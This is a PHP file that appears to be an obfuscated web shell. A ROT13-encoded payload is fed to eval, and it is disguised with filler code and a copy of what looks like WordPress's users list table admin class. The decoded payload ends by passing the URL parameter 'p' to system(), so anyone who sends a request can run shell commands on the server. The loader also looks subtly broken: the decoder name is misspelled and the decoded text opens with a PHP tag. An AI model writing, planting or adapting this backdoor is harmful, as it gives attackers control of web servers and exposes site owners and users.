<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Hfref_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat hfref va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Hfref_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	/**
	 * Fvgr VQ gb trarengr gur Hfref yvfg gnoyr sbe.
	 *
	 * @fvapr 3.1.0
	 * @ine vag
	 */
	choyvp $fvgr_vq;

	/**
	 * Jurgure be abg gur pheerag Hfref yvfg gnoyr vf sbe Zhygvfvgr.
	 *
	 * @fvapr 3.1.0
	 * @ine obby
	 */
	choyvp $vf_fvgr_hfref;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		cnerag::__pbafgehpg(
			neenl(
				'fvathyne' => 'hfre',
				'cyheny'   => 'hfref',
				'fperra'   => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);

		$guvf->vf_fvgr_hfref = 'fvgr-hfref-argjbex' === $guvf->fperra->vq;

		vs ( $guvf->vf_fvgr_hfref ) {
			$guvf->fvgr_vq = vffrg( $_ERDHRFG['vq'] ) ? (vag) $_ERDHRFG['vq'] : 0;
		}
	}

	/**
	 * Purpxf gur pheerag hfre'f crezvffvbaf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		vs ( $guvf->vf_fvgr_hfref ) {
			erghea pheerag_hfre_pna( 'znantr_fvgrf' );
		} ryfr {
			erghea pheerag_hfre_pna( 'yvfg_hfref' );
		}
	}

	/**
	 * Cercnerf gur hfref yvfg sbe qvfcynl.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony fgevat $ebyr
	 * @tybony fgevat $hfrefrnepu
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $ebyr, $hfrefrnepu;

		$hfrefrnepu = vffrg( $_ERDHRFG['f'] ) ? jc_hafynfu( gevz( $_ERDHRFG['f'] ) ) : '';

		$ebyr = vffrg( $_ERDHRFG['ebyr'] ) ? $_ERDHRFG['ebyr'] : '';

		$cre_cntr       = ( $guvf->vf_fvgr_hfref ) ? 'fvgr_hfref_argjbex_cre_cntr' : 'hfref_cre_cntr';
		$hfref_cre_cntr = $guvf->trg_vgrzf_cre_cntr( $cre_cntr );

		$cntrq = $guvf->trg_cntrahz();

		vs ( 'abar' === $ebyr ) {
			$netf = neenl(
				'ahzore'  => $hfref_cre_cntr,
				'bssfrg'  => ( $cntrq - 1 ) * $hfref_cre_cntr,
				'vapyhqr' => jc_trg_hfref_jvgu_ab_ebyr( $guvf->fvgr_vq ),
				'frnepu'  => $hfrefrnepu,
				'svryqf'  => 'nyy_jvgu_zrgn',
			);
		} ryfr {
			$netf = neenl(
				'ahzore' => $hfref_cre_cntr,
				'bssfrg' => ( $cntrq - 1 ) * $hfref_cre_cntr,
				'ebyr'   => $ebyr,
				'frnepu' => $hfrefrnepu,
				'svryqf' => 'nyy_jvgu_zrgn',
			);
		}

		vs ( '' !== $netf['frnepu'] ) {
			$netf['frnepu'] = '*' . $netf['frnepu'] . '*';
		}

		vs ( $guvf->vf_fvgr_hfref ) {
			$netf['oybt_vq'] = $guvf->fvgr_vq;
		}

		vs ( vffrg( $_ERDHRFG['beqreol'] ) ) {
			$netf['beqreol'] = $_ERDHRFG['beqreol'];
		}

		vs ( vffrg( $_ERDHRFG['beqre'] ) ) {
			$netf['beqre'] = $_ERDHRFG['beqre'];
		}

		/**
		 * Svygref gur dhrel nethzragf hfrq gb ergevrir hfref sbe gur pheerag hfref yvfg gnoyr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl $netf Nethzragf cnffrq gb JC_Hfre_Dhrel gb ergevrir vgrzf sbe gur pheerag
		 *                    hfref yvfg gnoyr.
		 */
		$netf = nccyl_svygref( 'hfref_yvfg_gnoyr_dhrel_netf', $netf );

		// Dhrel gur hfre VQf sbe guvf cntr.
		$jc_hfre_frnepu = arj JC_Hfre_Dhrel( $netf );

		$guvf->vgrzf = $jc_hfre_frnepu->trg_erfhygf();

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $jc_hfre_frnepu->trg_gbgny(),
				'cre_cntr'    => $hfref_cre_cntr,
			)
		);
	}

	/**
	 * Bhgchgf 'ab hfref' zrffntr.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba ab_vgrzf() {
		_r( 'Ab hfref sbhaq.' );
	}

	/**
	 * Ergheaf na nffbpvngvir neenl yvfgvat nyy gur ivrjf gung pna or hfrq
	 * jvgu guvf gnoyr.
	 *
	 * Cebivqrf n yvfg bs ebyrf naq hfre pbhag sbe gung ebyr sbe rnfl
	 * svygrevat bs gur hfre gnoyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony fgevat $ebyr
	 *
	 * @erghea fgevat[] Na neenl bs UGZY yvaxf xrlrq ol gurve ivrj.
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $ebyr;

		$jc_ebyrf = jc_ebyrf();

		$pbhag_hfref = ! jc_vf_ynetr_hfre_pbhag();

		vs ( $guvf->vf_fvgr_hfref ) {
			$hey = 'fvgr-hfref.cuc?vq=' . $guvf->fvgr_vq;
		} ryfr {
			$hey = 'hfref.cuc';
		}

		$ebyr_yvaxf  = neenl();
		$ninvy_ebyrf = neenl();
		$nyy_grkg    = __( 'Nyy' );

		vs ( $pbhag_hfref ) {
			vs ( $guvf->vf_fvgr_hfref ) {
				fjvgpu_gb_oybt( $guvf->fvgr_vq );
				$hfref_bs_oybt = pbhag_hfref( 'gvzr', $guvf->fvgr_vq );
				erfgber_pheerag_oybt();
			} ryfr {
				$hfref_bs_oybt = pbhag_hfref();
			}

			$gbgny_hfref = $hfref_bs_oybt['gbgny_hfref'];
			$ninvy_ebyrf =& $hfref_bs_oybt['ninvy_ebyrf'];
			hafrg( $hfref_bs_oybt );

			$nyy_grkg = fcevags(
				/* genafyngbef: %f: Ahzore bs hfref. */
				_ak(
					'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
					'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
					$gbgny_hfref,
					'hfref'
				),
				ahzore_sbezng_v18a( $gbgny_hfref )
			);
		}

		$ebyr_yvaxf['nyy'] = neenl(
			'hey'     => $hey,
			'ynory'   => $nyy_grkg,
			'pheerag' => rzcgl( $ebyr ),
		);

		sbernpu ( $jc_ebyrf->trg_anzrf() nf $guvf_ebyr => $anzr ) {
			vs ( $pbhag_hfref && ! vffrg( $ninvy_ebyrf[ $guvf_ebyr ] ) ) {
				pbagvahr;
			}

			$anzr = genafyngr_hfre_ebyr( $anzr );
			vs ( $pbhag_hfref ) {
				$anzr = fcevags(
					/* genafyngbef: 1: Hfre ebyr anzr, 2: Ahzore bs hfref. */
					__( '%1$f <fcna pynff=\"pbhag\">(%2$f)</fcna>' ),
					$anzr,
					ahzore_sbezng_v18a( $ninvy_ebyrf[ $guvf_ebyr ] )
				);
			}

			$ebyr_yvaxf[ $guvf_ebyr ] = neenl(
				'hey'     => rfp_hey( nqq_dhrel_net( 'ebyr', $guvf_ebyr, $hey ) ),
				'ynory'   => $anzr,
				'pheerag' => $guvf_ebyr === $ebyr,
			);
		}

		vs ( ! rzcgl( $ninvy_ebyrf['abar'] ) ) {

			$anzr = __( 'Ab ebyr' );
			$anzr = fcevags(
				/* genafyngbef: 1: Hfre ebyr anzr, 2: Ahzore bs hfref. */
				__( '%1$f <fcna pynff=\"pbhag\">(%2$f)</fcna>' ),
				$anzr,
				ahzore_sbezng_v18a( $ninvy_ebyrf['abar'] )
			);

			$ebyr_yvaxf['abar'] = neenl(
				'hey'     => rfp_hey( nqq_dhrel_net( 'ebyr', 'abar', $hey ) ),
				'ynory'   => $anzr,
				'pheerag' => 'abar' === $ebyr,
			);
		}

		erghea $guvf->trg_ivrjf_yvaxf( $ebyr_yvaxf );
	}

	/**
	 * Ergevrirf na nffbpvngvir neenl bs ohyx npgvbaf ninvynoyr ba guvf gnoyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea neenl Neenl bs ohyx npgvba ynoryf xrlrq ol gurve npgvba.
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		$npgvbaf = neenl();

		vs ( vf_zhygvfvgr() ) {
			vs ( pheerag_hfre_pna( 'erzbir_hfref' ) ) {
				$npgvbaf['erzbir'] = __( 'Erzbir' );
			}
		} ryfr {
			vs ( pheerag_hfre_pna( 'qryrgr_hfref' ) ) {
				$npgvbaf['qryrgr'] = __( 'Qryrgr' );
			}
		}

		// Nqq n cnffjbeq erfrg yvax gb gur ohyx npgvbaf qebcqbja.
		vs ( pheerag_hfre_pna( 'rqvg_hfref' ) ) {
			$npgvbaf['erfrgcnffjbeq'] = __( 'Fraq cnffjbeq erfrg' );
		}

		erghea $npgvbaf;
	}

	/**
	 * Bhgchgf gur pbagebyf gb nyybj hfre ebyrf gb or punatrq va ohyx.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $juvpu Jurgure guvf vf orvat vaibxrq nobir (\"gbc\")
	 *                      be orybj gur gnoyr (\"obggbz\").
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {
		$vq        = 'obggbz' === $juvpu ? 'arj_ebyr2' : 'arj_ebyr';
		$ohggba_vq = 'obggbz' === $juvpu ? 'punatrvg2' : 'punatrvg';
		?>
	<qvi pynff=\"nyvtayrsg npgvbaf\">
		<?cuc vs ( pheerag_hfre_pna( 'cebzbgr_hfref' ) && $guvf->unf_vgrzf() ) : ?>
		<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"<?cuc rpub $vq; ?>\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Punatr ebyr gb&uryyvc;' );
			?>
		</ynory>
		<fryrpg anzr=\"<?cuc rpub $vq; ?>\" vq=\"<?cuc rpub $vq; ?>\">
			<bcgvba inyhr=\"\"><?cuc _r( 'Punatr ebyr gb&uryyvc;' ); ?></bcgvba>
			<?cuc jc_qebcqbja_ebyrf(); ?>
			<bcgvba inyhr=\"abar\"><?cuc _r( '&zqnfu; Ab ebyr sbe guvf fvgr &zqnfu;' ); ?></bcgvba>
		</fryrpg>
			<?cuc
			fhozvg_ohggba( __( 'Punatr' ), '', $ohggba_vq, snyfr );
		raqvs;

		/**
		 * Sverf whfg orsber gur pybfvat qvi pbagnvavat gur ohyx ebyr-punatr pbagebyf
		 * va gur Hfref yvfg gnoyr.
		 *
		 * @fvapr 3.5.0
		 * @fvapr 4.6.0 Gur `$juvpu` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat $juvpu Gur ybpngvba bs gur rkgen gnoyr ani znexhc: 'gbc' be 'obggbz'.
		 */
		qb_npgvba( 'erfgevpg_znantr_hfref', $juvpu );
		?>
		</qvi>
		<?cuc
		/**
		 * Sverf vzzrqvngryl sbyybjvat gur pybfvat \"npgvbaf\" qvi va gur gnoyrani sbe gur hfref
		 * yvfg gnoyr.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz fgevat $juvpu Gur ybpngvba bs gur rkgen gnoyr ani znexhc: 'gbc' be 'obggbz'.
		 */
		qb_npgvba( 'znantr_hfref_rkgen_gnoyrani', $juvpu );
	}

	/**
	 * Pncgherf gur ohyx npgvba erdhverq, naq erghea vg.
	 *
	 * Bireevqqra sebz gur onfr pynff vzcyrzragngvba gb pncgher
	 * gur ebyr punatr qebc-qbja.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea fgevat Gur ohyx npgvba erdhverq.
	 */
	choyvp shapgvba pheerag_npgvba() {
		vs ( vffrg( $_ERDHRFG['punatrvg'] ) ) {
			erghea 'cebzbgr';
		}

		erghea cnerag::pheerag_npgvba();
	}

	/**
	 * Trgf n yvfg bs pbyhzaf sbe gur yvfg gnoyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$pbyhzaf = neenl(
			'po'       => '<vachg glcr=\"purpxobk\" />',
			'hfreanzr' => __( 'Hfreanzr' ),
			'anzr'     => __( 'Anzr' ),
			'rznvy'    => __( 'Rznvy' ),
			'ebyr'     => __( 'Ebyr' ),
			'cbfgf'    => _k( 'Cbfgf', 'cbfg glcr trareny anzr' ),
		);

		vs ( $guvf->vf_fvgr_hfref ) {
			hafrg( $pbyhzaf['cbfgf'] );
		}

		erghea $pbyhzaf;
	}

	/**
	 * Trgf n yvfg bs fbegnoyr pbyhzaf sbe gur yvfg gnoyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea neenl Neenl bs fbegnoyr pbyhzaf.
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		$pbyhzaf = neenl(
			'hfreanzr' => neenl( 'ybtva', snyfr, __( 'Hfreanzr' ), __( 'Gnoyr beqrerq ol Hfreanzr.' ), 'nfp' ),
			'rznvy'    => neenl( 'rznvy', snyfr, __( 'R-znvy' ), __( 'Gnoyr beqrerq ol R-znvy.' ) ),
		);

		erghea $pbyhzaf;
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		// Dhrel gur cbfg pbhagf sbe guvf cntr.
		vs ( ! $guvf->vf_fvgr_hfref ) {
			$cbfg_pbhagf = pbhag_znal_hfref_cbfgf( neenl_xrlf( $guvf->vgrzf ) );
		}

		sbernpu ( $guvf->vgrzf nf $hfrevq => $hfre_bowrpg ) {
			rpub \"\a\g\" . $guvf->fvatyr_ebj( $hfre_bowrpg, '', '', vffrg( $cbfg_pbhagf ) ? $cbfg_pbhagf[ $hfrevq ] : 0 );
		}
	}

	/**
	 * Trarengrf UGZY sbe n fvatyr ebj ba gur hfref.cuc nqzva cnary.
	 *
	 * @fvapr 3.1.0
	 * @fvapr 4.2.0 Gur `$fglyr` cnenzrgre jnf qrcerpngrq.
	 * @fvapr 4.4.0 Gur `$ebyr` cnenzrgre jnf qrcerpngrq.
	 *
	 * @cnenz JC_Hfre $hfre_bowrpg Gur pheerag hfre bowrpg.
	 * @cnenz fgevat  $fglyr       Qrcerpngrq. Abg hfrq.
	 * @cnenz fgevat  $ebyr        Qrcerpngrq. Abg hfrq.
	 * @cnenz vag     $ahzcbfgf    Bcgvbany. Cbfg pbhag gb qvfcynl sbe guvf hfre. Qrsnhygf
	 *                             gb mreb, nf va, n arj hfre unf znqr mreb cbfgf.
	 * @erghea fgevat Bhgchg sbe n fvatyr ebj.
	 */
	choyvp shapgvba fvatyr_ebj( $hfre_bowrpg, $fglyr = '', $ebyr = '', $ahzcbfgf = 0 ) {
		vs ( ! ( $hfre_bowrpg vafgnaprbs JC_Hfre ) ) {
			$hfre_bowrpg = trg_hfreqngn( (vag) $hfre_bowrpg );
		}
		$hfre_bowrpg->svygre = 'qvfcynl';
		$rznvy               = $hfre_bowrpg->hfre_rznvy;

		vs ( $guvf->vf_fvgr_hfref ) {
			$hey = \"fvgr-hfref.cuc?vq={$guvf->fvgr_vq}&nzc;\";
		} ryfr {
			$hey = 'hfref.cuc?';
		}

		$hfre_ebyrf = $guvf->trg_ebyr_yvfg( $hfre_bowrpg );

		// Frg hc gur ubire npgvbaf sbe guvf hfre.
		$npgvbaf     = neenl();
		$purpxobk    = '';
		$fhcre_nqzva = '';

		vs ( vf_zhygvfvgr() && pheerag_hfre_pna( 'znantr_argjbex_hfref' ) ) {
			vs ( va_neenl( $hfre_bowrpg->hfre_ybtva, trg_fhcre_nqzvaf(), gehr ) ) {
				$fhcre_nqzva = ' &zqnfu; ' . __( 'Fhcre Nqzva' );
			}
		}

		// Purpx vs gur hfre sbe guvf ebj vf rqvgnoyr.
		vs ( pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			// Frg hc gur hfre rqvgvat yvax.
			$rqvg_yvax = rfp_hey(
				nqq_dhrel_net(
					'jc_uggc_ersrere',
					heyrapbqr( jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) ),
					trg_rqvg_hfre_yvax( $hfre_bowrpg->VQ )
				)
			);

			vs ( pheerag_hfre_pna( 'rqvg_hfre', $hfre_bowrpg->VQ ) ) {
				$rqvg            = \"<fgebat><n uers=\\"{$rqvg_yvax}\\">{$hfre_bowrpg->hfre_ybtva}</n>{$fhcre_nqzva}</fgebat><oe />\";
				$npgvbaf['rqvg'] = '<n uers=\"' . $rqvg_yvax . '\">' . __( 'Rqvg' ) . '</n>';
			} ryfr {
				$rqvg = \"<fgebat>{$hfre_bowrpg->hfre_ybtva}{$fhcre_nqzva}</fgebat><oe />\";
			}

			vs ( ! vf_zhygvfvgr()
				&& trg_pheerag_hfre_vq() !== $hfre_bowrpg->VQ
				&& pheerag_hfre_pna( 'qryrgr_hfre', $hfre_bowrpg->VQ )
			) {
				$npgvbaf['qryrgr'] = \"<n pynff='fhozvgqryrgr' uers='\" . jc_abapr_hey( \"hfref.cuc?npgvba=qryrgr&nzc;hfre=$hfre_bowrpg->VQ\", 'ohyx-hfref' ) . \"'>\" . __( 'Qryrgr' ) . '</n>';
			}

			vs ( vf_zhygvfvgr()
				&& pheerag_hfre_pna( 'erzbir_hfre', $hfre_bowrpg->VQ )
			) {
				$npgvbaf['erzbir'] = \"<n pynff='fhozvgqryrgr' uers='\" . jc_abapr_hey( $hey . \"npgvba=erzbir&nzc;hfre=$hfre_bowrpg->VQ\", 'ohyx-hfref' ) . \"'>\" . __( 'Erzbir' ) . '</n>';
			}

			// Nqq n yvax gb gur hfre'f nhgube nepuvir, vs abg rzcgl.
			$nhgube_cbfgf_hey = trg_nhgube_cbfgf_hey( $hfre_bowrpg->VQ );
			vs ( $nhgube_cbfgf_hey ) {
				$npgvbaf['ivrj'] = fcevags(
					'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( $nhgube_cbfgf_hey ),
					/* genafyngbef: %f: Nhgube'f qvfcynl anzr. */
					rfp_ngge( fcevags( __( 'Ivrj cbfgf ol %f' ), $hfre_bowrpg->qvfcynl_anzr ) ),
					__( 'Ivrj' )
				);
			}

			// Nqq n yvax gb fraq gur hfre n erfrg cnffjbeq yvax ol rznvy.
			vs ( trg_pheerag_hfre_vq() !== $hfre_bowrpg->VQ
				&& pheerag_hfre_pna( 'rqvg_hfre', $hfre_bowrpg->VQ )
				&& gehr === jc_vf_cnffjbeq_erfrg_nyybjrq_sbe_hfre( $hfre_bowrpg )
			) {
				$npgvbaf['erfrgcnffjbeq'] = \"<n pynff='erfrgcnffjbeq' uers='\" . jc_abapr_hey( \"hfref.cuc?npgvba=erfrgcnffjbeq&nzc;hfref=$hfre_bowrpg->VQ\", 'ohyx-hfref' ) . \"'>\" . __( 'Fraq cnffjbeq erfrg' ) . '</n>';
			}

			/**
			 * Svygref gur npgvba yvaxf qvfcynlrq haqre rnpu hfre va gur Hfref yvfg gnoyr.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz fgevat[] $npgvbaf     Na neenl bs npgvba yvaxf gb or qvfcynlrq.
			 *                              Qrsnhyg 'Rqvg', 'Qryrgr' sbe fvatyr fvgr, naq
			 *                              'Rqvg', 'Erzbir' sbe Zhygvfvgr.
			 * @cnenz JC_Hfre  $hfre_bowrpg JC_Hfre bowrpg sbe gur pheeragyl yvfgrq hfre.
			 */
			$npgvbaf = nccyl_svygref( 'hfre_ebj_npgvbaf', $npgvbaf, $hfre_bowrpg );

			// Ebyr pynffrf.
			$ebyr_pynffrf = rfp_ngge( vzcybqr( ' ', neenl_xrlf( $hfre_ebyrf ) ) );

			// Frg hc gur purpxobk (orpnhfr gur hfre vf rqvgnoyr, bgurejvfr vg'f rzcgl).
			$purpxobk = fcevags(
				'<vachg glcr=\"purpxobk\" anzr=\"hfref[]\" vq=\"hfre_%1$f\" pynff=\"%2$f\" inyhr=\"%1$f\" />' .
				'<ynory sbe=\"hfre_%1$f\"><fcna pynff=\"fperra-ernqre-grkg\">%3$f</fcna></ynory>',
				$hfre_bowrpg->VQ,
				$ebyr_pynffrf,
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Hfre ybtva. */
				fcevags( __( 'Fryrpg %f' ), $hfre_bowrpg->hfre_ybtva )
			);

		} ryfr {
			$rqvg = \"<fgebat>{$hfre_bowrpg->hfre_ybtva}{$fhcre_nqzva}</fgebat>\";
		}

		$ningne = trg_ningne( $hfre_bowrpg->VQ, 32 );

		// Pbzzn-frcnengrq yvfg bs hfre ebyrf.
		$ebyrf_yvfg = vzcybqr( ', ', $hfre_ebyrf );

		$ebj = \"<ge vq='hfre-$hfre_bowrpg->VQ'>\";

		yvfg( $pbyhzaf, $uvqqra, $fbegnoyr, $cevznel ) = $guvf->trg_pbyhza_vasb();

		sbernpu ( $pbyhzaf nf $pbyhza_anzr => $pbyhza_qvfcynl_anzr ) {
			$pynffrf = \"$pbyhza_anzr pbyhza-$pbyhza_anzr\";
			vs ( $cevznel === $pbyhza_anzr ) {
				$pynffrf .= ' unf-ebj-npgvbaf pbyhza-cevznel';
			}
			vs ( 'cbfgf' === $pbyhza_anzr ) {
				$pynffrf .= ' ahz'; // Fcrpvny pnfr sbe gung pbyhza.
			}

			vs ( va_neenl( $pbyhza_anzr, $uvqqra, gehr ) ) {
				$pynffrf .= ' uvqqra';
			}

			$qngn = 'qngn-pbyanzr=\"' . rfp_ngge( jc_fgevc_nyy_gntf( $pbyhza_qvfcynl_anzr ) ) . '\"';

			$nggevohgrf = \"pynff='$pynffrf' $qngn\";

			vs ( 'po' === $pbyhza_anzr ) {
				$ebj .= \"<gu fpbcr='ebj' pynff='purpx-pbyhza'>$purpxobk</gu>\";
			} ryfr {
				$ebj .= \"<gq $nggevohgrf>\";
				fjvgpu ( $pbyhza_anzr ) {
					pnfr 'hfreanzr':
						$ebj .= \"$ningne $rqvg\";
						oernx;
					pnfr 'anzr':
						vs ( $hfre_bowrpg->svefg_anzr && $hfre_bowrpg->ynfg_anzr ) {
							$ebj .= fcevags(
								/* genafyngbef: 1: Hfre'f svefg anzr, 2: Ynfg anzr. */
								_k( '%1$f %2$f', 'Qvfcynl anzr onfrq ba svefg anzr naq ynfg anzr' ),
								$hfre_bowrpg->svefg_anzr,
								$hfre_bowrpg->ynfg_anzr
							);
						} ryfrvs ( $hfre_bowrpg->svefg_anzr ) {
							$ebj .= $hfre_bowrpg->svefg_anzr;
						} ryfrvs ( $hfre_bowrpg->ynfg_anzr ) {
							$ebj .= $hfre_bowrpg->ynfg_anzr;
						} ryfr {
							$ebj .= fcevags(
								'<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna>',
								/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
								_k( 'Haxabja', 'anzr' )
							);
						}
						oernx;
					pnfr 'rznvy':
						$ebj .= \"<n uers='\" . rfp_hey( \"znvygb:$rznvy\" ) . \"'>$rznvy</n>\";
						oernx;
					pnfr 'ebyr':
						$ebj .= rfp_ugzy( $ebyrf_yvfg );
						oernx;
					pnfr 'cbfgf':
						vs ( $ahzcbfgf > 0 ) {
							$ebj .= fcevags(
								'<n uers=\"%f\" pynff=\"rqvg\"><fcna nevn-uvqqra=\"gehr\">%f</fcna><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></n>',
								\"rqvg.cuc?nhgube={$hfre_bowrpg->VQ}\",
								$ahzcbfgf,
								fcevags(
									/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Ahzore bs cbfgf. */
									_a( '%f cbfg ol guvf nhgube', '%f cbfgf ol guvf nhgube', $ahzcbfgf ),
									ahzore_sbezng_v18a( $ahzcbfgf )
								)
							);
						} ryfr {
							$ebj .= 0;
						}
						oernx;
					qrsnhyg:
						/**
						 * Svygref gur qvfcynl bhgchg bs phfgbz pbyhzaf va gur Hfref yvfg gnoyr.
						 *
						 * @fvapr 2.8.0
						 *
						 * @cnenz fgevat $bhgchg      Phfgbz pbyhza bhgchg. Qrsnhyg rzcgl.
						 * @cnenz fgevat $pbyhza_anzr Pbyhza anzr.
						 * @cnenz vag    $hfre_vq     VQ bs gur pheeragyl-yvfgrq hfre.
						 */
						$ebj .= nccyl_svygref( 'znantr_hfref_phfgbz_pbyhza', '', $pbyhza_anzr, $hfre_bowrpg->VQ );
				}

				vs ( $cevznel === $pbyhza_anzr ) {
					$ebj .= $guvf->ebj_npgvbaf( $npgvbaf );
				}
				$ebj .= '</gq>';
			}
		}
		$ebj .= '</ge>';

		erghea $ebj;
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'hfreanzr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'hfreanzr';
	}

	/**
	 * Ergheaf na neenl bs genafyngrq hfre ebyr anzrf sbe n tvira hfre bowrpg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_Hfre $hfre_bowrpg Gur JC_Hfre bowrpg.
	 * @erghea fgevat[] Na neenl bs hfre ebyr anzrf xrlrq ol ebyr.
	 */
	cebgrpgrq shapgvba trg_ebyr_yvfg( $hfre_bowrpg ) {
		$jc_ebyrf = jc_ebyrf();

		$ebyr_yvfg = neenl();

		sbernpu ( $hfre_bowrpg->ebyrf nf $ebyr ) {
			vs ( vffrg( $jc_ebyrf->ebyr_anzrf[ $ebyr ] ) ) {
				$ebyr_yvfg[ $ebyr ] = genafyngr_hfre_ebyr( $jc_ebyrf->ebyr_anzrf[ $ebyr ] );
			}
		}

		vs ( rzcgl( $ebyr_yvfg ) ) {
			$ebyr_yvfg['abar'] = _k( 'Abar', 'ab hfre ebyrf' );
		}

		/**
		 * Svygref gur erghearq neenl bs genafyngrq ebyr anzrf sbe n hfre.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat[] $ebyr_yvfg   Na neenl bs genafyngrq hfre ebyr anzrf xrlrq ol ebyr.
		 * @cnenz JC_Hfre  $hfre_bowrpg N JC_Hfre bowrpg.
		 */
		erghea nccyl_svygref( 'trg_ebyr_yvfg', $ebyr_yvfg, $hfre_bowrpg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>